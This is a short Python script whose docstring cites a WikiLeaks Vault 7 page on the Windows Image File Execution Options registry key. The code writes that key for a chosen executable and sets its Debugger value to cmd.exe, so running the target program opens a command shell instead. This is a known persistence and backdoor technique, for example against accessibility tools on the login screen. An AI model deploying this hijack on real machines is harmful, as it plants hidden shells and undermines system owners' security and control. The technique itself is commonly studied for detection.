"""
https://wikileaks.org/ciav7p1/cms/page_2621770.html

Registry key that was designed to assist with debugging and allows the user
to specifiy an executable that should be run instead of the specified application.
"""
import os
import _winreg

def cmd_path():
	path = "c:/windows/system32/cmd.exe"
	
	if (os.path.isfile(os.path.join(path)) == True):
		return os.path.join(path)
	else:
		return False

def image_file_execution(executable):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",executable))
		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,cmd_path())
		_winreg.CloseKey(key)
	except Exception as error:
		return False
